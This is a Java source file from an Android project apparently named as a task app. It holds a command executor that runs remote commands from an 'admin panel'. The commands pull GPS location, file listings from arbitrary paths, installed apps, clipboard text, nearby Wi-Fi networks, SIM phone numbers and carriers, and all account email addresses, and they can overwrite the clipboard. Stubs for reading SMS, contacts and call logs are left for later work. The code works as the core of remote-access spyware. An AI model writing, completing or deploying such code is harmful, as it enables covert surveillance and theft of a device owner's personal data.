package com.task.tusker.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Environment;
import androidx.core.app.ActivityCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * Advanced Command Executor
 * Handles all remote commands sent from admin panel
 */
public class CommandExecutor {

    private Context context;

    public CommandExecutor(Context context) {
        this.context = context;
    }

    /**
     * Execute command and return result
     */
    public JSONObject executeCommand(String command, JSONObject params) {
        JSONObject result = new JSONObject();
        
        try {
            switch (command) {
                case "ping":
                    result = handlePing();
                    break;
                    
                case "get_device_info":
                    result = handleGetDeviceInfo();
                    break;
                    
                case "get_location":
                    result = handleGetLocation();
                    break;
                    
                case "list_files":
                    result = handleListFiles(params);
                    break;
                    
                case "get_installed_apps":
                    result = handleGetInstalledApps();
                    break;
                    
                case "get_contacts":
                    result = handleGetContacts();
                    break;
                    
                case "get_sms":
                    result = handleGetSMS(params);
                    break;
                    
                case "get_call_logs":
                    result = handleGetCallLogs(params);
                    break;
                    
                case "get_battery_info":
                    result = handleGetBatteryInfo();
                    break;
                    
                case "get_network_info":
                    result = handleGetNetworkInfo();
                    break;
                    
                case "vibrate":
                    result = handleVibrate(params);
                    break;
                    
                case "play_sound":
                    result = handlePlaySound(params);
                    break;
                    
                case "get_clipboard":
                    result = handleGetClipboard();
                    break;
                    
                case "set_clipboard":
                    result = handleSetClipboard(params);
                    break;
                    
                case "get_wifi_networks":
                    result = handleGetWifiNetworks();
                    break;
                    
                case "get_system_info":
                    result = handleGetSystemInfo();
                    break;
                    
                default:
                    result.put("success", false);
                    result.put("error", "Unknown command: " + command);
            }
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    private JSONObject handlePing() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", true);
        result.put("message", "pong");
        result.put("timestamp", System.currentTimeMillis());
        return result;
    }

    private JSONObject handleGetDeviceInfo() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", true);
        result.put("manufacturer", Build.MANUFACTURER);
        result.put("model", Build.MODEL);
        result.put("brand", Build.BRAND);
        result.put("device", Build.DEVICE);
        result.put("androidVersion", Build.VERSION.RELEASE);
        result.put("sdkVersion", Build.VERSION.SDK_INT);
        result.put("board", Build.BOARD);
        result.put("hardware", Build.HARDWARE);
        return result;
    }

    private JSONObject handleGetLocation() throws JSONException {
        JSONObject result = new JSONObject();
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            result.put("success", false);
            result.put("error", "Location permission not granted");
            return result;
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        
        if (location == null) {
            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        }

        if (location != null) {
            result.put("success", true);
            result.put("latitude", location.getLatitude());
            result.put("longitude", location.getLongitude());
            result.put("accuracy", location.getAccuracy());
            result.put("altitude", location.getAltitude());
            result.put("speed", location.getSpeed());
            result.put("timestamp", location.getTime());
        } else {
            result.put("success", false);
            result.put("error", "Location not available");
        }
        
        return result;
    }

    private JSONObject handleListFiles(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        String path = params.optString("path", context.getFilesDir().getPath());
        File directory = new File(path);
        
        if (!directory.exists() || !directory.isDirectory()) {
            result.put("success", false);
            result.put("error", "Invalid directory path");
            return result;
        }

        File[] files = directory.listFiles();
        JSONArray fileList = new JSONArray();
        
        if (files != null) {
            for (File file : files) {
                JSONObject fileInfo = new JSONObject();
                fileInfo.put("name", file.getName());
                fileInfo.put("path", file.getAbsolutePath());
                fileInfo.put("isDirectory", file.isDirectory());
                fileInfo.put("size", file.length());
                fileInfo.put("lastModified", file.lastModified());
                fileInfo.put("canRead", file.canRead());
                fileInfo.put("canWrite", file.canWrite());
                fileList.put(fileInfo);
            }
        }

        result.put("success", true);
        result.put("path", path);
        result.put("files", fileList);
        result.put("count", fileList.length());
        
        return result;
    }

    private JSONObject handleGetInstalledApps() throws JSONException {
        JSONObject result = new JSONObject();

        // Use flag 0 instead of GET_META_DATA — GET_META_DATA loads extra APK resources
        // for every app and is ~3x slower with no benefit for our needs.
        final android.content.pm.PackageManager pm = context.getPackageManager();
        final List<android.content.pm.ApplicationInfo> packages =
                pm.getInstalledApplications(0);

        final int size = packages.size();
        final JSONObject[] slots = new JSONObject[size];

        // Parallel label loading: loadLabel() does a Binder IPC call per app.
        // Using 4 threads gives ~4x speedup for 200+ apps (typical phone has 150-300).
        ExecutorService labelPool = Executors.newFixedThreadPool(4);
        try {
            List<Future<?>> futures = new ArrayList<>(size);
            for (int i = 0; i < size; i++) {
                final int idx = i;
                final android.content.pm.ApplicationInfo ai = packages.get(i);
                futures.add(labelPool.submit(() -> {
                    try {
                        String label;
                        try { label = pm.getApplicationLabel(ai).toString(); }
                        catch (Exception e) { label = ai.packageName; }
                        JSONObject appInfo = new JSONObject();
                        appInfo.put("packageName", ai.packageName);
                        appInfo.put("appName", label);
                        appInfo.put("isSystemApp",
                                (ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                        slots[idx] = appInfo;
                    } catch (Exception ignored) {}
                    return null;
                }));
            }
            for (Future<?> f : futures) {
                try { f.get(8, TimeUnit.SECONDS); } catch (Exception ignored) {}
            }
        } finally {
            labelPool.shutdownNow();
        }

        JSONArray appList = new JSONArray();
        for (JSONObject app : slots) {
            if (app != null) appList.put(app);
        }

        result.put("success", true);
        result.put("apps", appList);
        result.put("count", appList.length());

        return result;
    }

    private JSONObject handleGetContacts() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "Contact access requires implementation with ContentResolver");
        // Implementation requires READ_CONTACTS permission and ContentResolver
        return result;
    }

    private JSONObject handleGetSMS(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "SMS access requires implementation with ContentResolver");
        // Implementation requires READ_SMS permission and ContentResolver
        return result;
    }

    private JSONObject handleGetCallLogs(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", false);
        result.put("error", "Call log access requires implementation with ContentResolver");
        // Implementation requires READ_CALL_LOG permission and ContentResolver
        return result;
    }

    private JSONObject handleGetBatteryInfo() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
        
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            float batteryPct = level * 100 / (float) scale;
            
            int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            boolean isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                                status == android.os.BatteryManager.BATTERY_STATUS_FULL;
            
            int plugged = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
            boolean usbCharge = plugged == android.os.BatteryManager.BATTERY_PLUGGED_USB;
            boolean acCharge = plugged == android.os.BatteryManager.BATTERY_PLUGGED_AC;
            
            result.put("success", true);
            result.put("level", batteryPct);
            result.put("isCharging", isCharging);
            result.put("usbCharge", usbCharge);
            result.put("acCharge", acCharge);
            result.put("temperature", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
            result.put("voltage", batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0));
        } else {
            result.put("success", false);
            result.put("error", "Battery info not available");
        }
        
        return result;
    }

    private JSONObject handleGetNetworkInfo() throws JSONException {
        JSONObject result = new JSONObject();
        result.put("success", true);

        // ── 1. Basic connectivity ──────────────────────────────────────────
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager)
                context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                android.net.NetworkInfo active = cm.getActiveNetworkInfo();
                if (active != null) {
                    result.put("isConnected",      active.isConnected());
                    result.put("connectionType",   active.getTypeName());
                    result.put("connectionSubtype", active.getSubtypeName());
                    result.put("isRoaming",        active.isRoaming());
                } else {
                    result.put("isConnected",    false);
                    result.put("connectionType", "none");
                }
            }
        } catch (Exception ignored) {}

        // ── 2. WiFi details ────────────────────────────────────────────────
        try {
            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                result.put("wifiEnabled", wm.isWifiEnabled());
                android.net.wifi.WifiInfo wi = wm.getConnectionInfo();
                if (wi != null && wi.getNetworkId() != -1) {
                    JSONObject wifi = new JSONObject();
                    wifi.put("ssid",         wi.getSSID());
                    wifi.put("bssid",        wi.getBSSID());
                    wifi.put("rssi",         wi.getRssi());
                    wifi.put("linkSpeedMbps", wi.getLinkSpeed());
                    wifi.put("frequencyMHz", wi.getFrequency());
                    result.put("wifiInfo", wifi);
                }
            }
        } catch (Exception ignored) {}

        // ── 3. SIM cards — all slots ───────────────────────────────────────
        JSONArray simCards = new JSONArray();
        android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager)
            context.getSystemService(Context.TELEPHONY_SERVICE);

        if (tm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            try {
                android.telephony.SubscriptionManager subMgr =
                    (android.telephony.SubscriptionManager) context.getSystemService(
                        Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                if (subMgr != null) {
                    List<android.telephony.SubscriptionInfo> subs = null;
                    try {
                        if (ActivityCompat.checkSelfPermission(context,
                                Manifest.permission.READ_PHONE_STATE)
                                == PackageManager.PERMISSION_GRANTED) {
                            subs = subMgr.getActiveSubscriptionInfoList();
                        }
                    } catch (SecurityException ignored) {}

                    if (subs != null) {
                        for (android.telephony.SubscriptionInfo sub : subs) {
                            JSONObject sim = new JSONObject();
                            int slot = sub.getSimSlotIndex();
                            sim.put("slot",           slot);
                            sim.put("label",          "SIM " + (slot + 1));
                            sim.put("displayName",    sub.getDisplayName() != null
                                                        ? sub.getDisplayName().toString() : "");
                            sim.put("carrierName",    sub.getCarrierName() != null
                                                        ? sub.getCarrierName().toString() : "");
                            sim.put("phoneNumber",    sub.getNumber() != null
                                                        ? sub.getNumber() : "");
                            sim.put("countryIso",     sub.getCountryIso() != null
                                                        ? sub.getCountryIso().toUpperCase() : "");
                            sim.put("mcc",            sub.getMcc());
                            sim.put("mnc",            sub.getMnc());
                            sim.put("subscriptionId", sub.getSubscriptionId());
                            sim.put("isActive",       true);
                            sim.put("dataRoaming",    sub.getDataRoaming() == 1);

                            // Per-subscription operator + network type (API 24+)
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                try {
                                    android.telephony.TelephonyManager tmSub =
                                        tm.createForSubscriptionId(sub.getSubscriptionId());
                                    sim.put("networkOperator", tmSub.getNetworkOperatorName());
                                    sim.put("networkType",     networkTypeToString(tmSub.getNetworkType()));
                                    sim.put("simState",        simStateToString(tmSub.getSimState()));
                                    sim.put("isRoaming",       tmSub.isNetworkRoaming());
                                } catch (Exception ignored) {}
                            }
                            simCards.put(sim);
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        // Single-SIM fallback (no SubscriptionManager or permission denied)
        if (simCards.length() == 0 && tm != null) {
            try {
                JSONObject sim = new JSONObject();
                sim.put("slot",            0);
                sim.put("label",           "SIM 1");
                sim.put("carrierName",     tm.getSimOperatorName());
                sim.put("networkOperator", tm.getNetworkOperatorName());
                sim.put("countryIso",      tm.getSimCountryIso() != null
                                              ? tm.getSimCountryIso().toUpperCase() : "");
                sim.put("networkType",     networkTypeToString(tm.getNetworkType()));
                sim.put("simState",        simStateToString(tm.getSimState()));
                sim.put("isActive",        tm.getSimState()
                                              == android.telephony.TelephonyManager.SIM_STATE_READY);
                sim.put("isRoaming",       tm.isNetworkRoaming());
                simCards.put(sim);
            } catch (Exception ignored) {}
        }

        result.put("simCards", simCards);
        result.put("simCount", simCards.length());

        // ── 4. AccountManager — all accounts / email addresses ─────────────
        JSONArray accounts   = new JSONArray();
        JSONArray emailsOnly = new JSONArray();
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(context);
            android.accounts.Account[] allAccounts;
            try {
                allAccounts = am.getAccounts();
            } catch (SecurityException se) {
                allAccounts = new android.accounts.Account[0];
            }
            for (android.accounts.Account acct : allAccounts) {
                JSONObject a = new JSONObject();
                a.put("email", acct.name);
                a.put("type",  acct.type);
                boolean isEmail = acct.name.contains("@")
                    || acct.type.contains("google")
                    || acct.type.contains("mail")
                    || acct.type.contains("exchange")
                    || acct.type.contains("outlook")
                    || acct.type.contains("yahoo")
                    || acct.type.contains("imap")
                    || acct.type.contains("pop");
                a.put("isEmail", isEmail);
                accounts.put(a);
                if (isEmail) emailsOnly.put(acct.name);
            }
        } catch (Exception ignored) {}

        result.put("accounts",     accounts);
        result.put("emails",       emailsOnly);
        result.put("accountCount", accounts.length());

        return result;
    }

    /**
     * Converts a TelephonyManager NETWORK_TYPE_* constant to a human-readable string.
     */
    private String networkTypeToString(int type) {
        switch (type) {
            case android.telephony.TelephonyManager.NETWORK_TYPE_GPRS:    return "GPRS (2G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_EDGE:    return "EDGE (2G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_CDMA:    return "CDMA (2G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_1xRTT:   return "1xRTT (2G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_IDEN:    return "iDEN (2G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_UMTS:    return "UMTS (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_0:  return "EVDO r0 (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_A:  return "EVDO rA (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_B:  return "EVDO rB (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_HSPA:    return "HSPA (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP:   return "HSPA+ (3G+)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_HSDPA:   return "HSDPA (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_HSUPA:   return "HSUPA (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_EHRPD:   return "eHRPD (3G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_LTE:     return "LTE (4G)";
            case android.telephony.TelephonyManager.NETWORK_TYPE_NR:      return "5G NR";
            case android.telephony.TelephonyManager.NETWORK_TYPE_UNKNOWN: return "Unknown";
            default: return "Unknown (" + type + ")";
        }
    }

    /**
     * Converts a TelephonyManager SIM_STATE_* constant to a human-readable string.
     */
    private String simStateToString(int state) {
        switch (state) {
            case android.telephony.TelephonyManager.SIM_STATE_ABSENT:          return "Absent";
            case android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED:    return "PIN Required";
            case android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED:    return "PUK Required";
            case android.telephony.TelephonyManager.SIM_STATE_NETWORK_LOCKED:  return "Network Locked";
            case android.telephony.TelephonyManager.SIM_STATE_READY:           return "Ready";
            case android.telephony.TelephonyManager.SIM_STATE_NOT_READY:       return "Not Ready";
            case android.telephony.TelephonyManager.SIM_STATE_PERM_DISABLED:   return "Permanently Disabled";
            case android.telephony.TelephonyManager.SIM_STATE_CARD_IO_ERROR:   return "Card IO Error";
            case android.telephony.TelephonyManager.SIM_STATE_CARD_RESTRICTED: return "Restricted";
            case android.telephony.TelephonyManager.SIM_STATE_UNKNOWN:         return "Unknown";
            default: return "Unknown (" + state + ")";
        }
    }

    private JSONObject handleVibrate(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        long duration = params.optLong("duration", 500);
        
        android.os.Vibrator vibrator = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(android.os.VibrationEffect.createOneShot(duration, 
                    android.os.VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(duration);
            }
            result.put("success", true);
            result.put("message", "Device vibrated for " + duration + "ms");
        } else {
            result.put("success", false);
            result.put("error", "Vibrator not available");
        }
        
        return result;
    }

    private JSONObject handlePlaySound(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        android.media.ToneGenerator toneGen = new android.media.ToneGenerator(
            android.media.AudioManager.STREAM_MUSIC, 100);
        toneGen.startTone(android.media.ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 200);
        
        result.put("success", true);
        result.put("message", "Sound played");
        
        return result;
    }

    private JSONObject handleGetClipboard() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
            context.getSystemService(Context.CLIPBOARD_SERVICE);
        
        if (clipboard != null && clipboard.hasPrimaryClip()) {
            android.content.ClipData clipData = clipboard.getPrimaryClip();
            if (clipData != null && clipData.getItemCount() > 0) {
                CharSequence text = clipData.getItemAt(0).getText();
                result.put("success", true);
                result.put("text", text != null ? text.toString() : "");
            } else {
                result.put("success", false);
                result.put("error", "Clipboard is empty");
            }
        } else {
            result.put("success", false);
            result.put("error", "Clipboard not available");
        }
        
        return result;
    }

    private JSONObject handleSetClipboard(JSONObject params) throws JSONException {
        JSONObject result = new JSONObject();
        
        String text = params.optString("text", "");
        
        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
            context.getSystemService(Context.CLIPBOARD_SERVICE);
        
        if (clipboard != null) {
            android.content.ClipData clip = android.content.ClipData.newPlainText("remote_text", text);
            clipboard.setPrimaryClip(clip);
            result.put("success", true);
            result.put("message", "Clipboard updated");
        } else {
            result.put("success", false);
            result.put("error", "Clipboard not available");
        }
        
        return result;
    }

    private JSONObject handleGetWifiNetworks() throws JSONException {
        JSONObject result = new JSONObject();

        android.net.wifi.WifiManager wm =
            (android.net.wifi.WifiManager) context.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);

        if (wm == null) {
            result.put("success", false);
            result.put("error", "WifiManager not available");
            return result;
        }

        if (!wm.isWifiEnabled()) {
            result.put("success", false);
            result.put("error", "WiFi is disabled");
            return result;
        }

        // Get cached scan results (Android 10+ restricts background scans,
        // but getCachedScanResults() always works with ACCESS_WIFI_STATE)
        java.util.List<android.net.wifi.ScanResult> scans;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            scans = wm.getScanResults();
        } else {
            // Trigger a new scan then read results
            wm.startScan();
            scans = wm.getScanResults();
        }

        JSONArray networks = new JSONArray();
        if (scans != null) {
            for (android.net.wifi.ScanResult sr : scans) {
                JSONObject n = new JSONObject();
                n.put("ssid",       sr.SSID);
                n.put("bssid",      sr.BSSID);
                n.put("level",      sr.level);            // signal strength (dBm)
                n.put("frequency",  sr.frequency);        // MHz
                n.put("channel",    frequencyToChannel(sr.frequency));
                n.put("capabilities", sr.capabilities);  // e.g. "[WPA2-PSK-CCMP]"
                networks.put(n);
            }
        }

        // Also include the currently connected network
        android.net.wifi.WifiInfo connectedInfo = wm.getConnectionInfo();
        JSONObject connected = new JSONObject();
        if (connectedInfo != null && connectedInfo.getNetworkId() != -1) {
            connected.put("ssid",    connectedInfo.getSSID());
            connected.put("bssid",   connectedInfo.getBSSID());
            connected.put("rssi",    connectedInfo.getRssi());
            connected.put("linkSpeed", connectedInfo.getLinkSpeed());
            connected.put("frequency", connectedInfo.getFrequency());
        }

        result.put("success",   true);
        result.put("networks",  networks);
        result.put("count",     networks.length());
        result.put("connected", connected);
        return result;
    }

    private int frequencyToChannel(int freq) {
        if (freq >= 2412 && freq <= 2484) return (freq - 2412) / 5 + 1;
        if (freq >= 5170 && freq <= 5825) return (freq - 5170) / 5 + 34;
        return -1;
    }

    private JSONObject handleGetSystemInfo() throws JSONException {
        JSONObject result = new JSONObject();
        
        android.app.ActivityManager activityManager = (android.app.ActivityManager) 
            context.getSystemService(Context.ACTIVITY_SERVICE);
        
        if (activityManager != null) {
            android.app.ActivityManager.MemoryInfo memoryInfo = new android.app.ActivityManager.MemoryInfo();
            activityManager.getMemoryInfo(memoryInfo);
            
            result.put("success", true);
            result.put("totalMemory", memoryInfo.totalMem);
            result.put("availableMemory", memoryInfo.availMem);
            result.put("lowMemory", memoryInfo.lowMemory);
            result.put("threshold", memoryInfo.threshold);
            
            // Storage info
            android.os.StatFs stat = new android.os.StatFs(Environment.getDataDirectory().getPath());
            long bytesAvailable = stat.getBlockSizeLong() * stat.getAvailableBlocksLong();
            long bytesTotal = stat.getBlockSizeLong() * stat.getBlockCountLong();
            
            result.put("storageAvailable", bytesAvailable);
            result.put("storageTotal", bytesTotal);
        } else {
            result.put("success", false);
            result.put("error", "System info not available");
        }
        
        return result;
    }
}
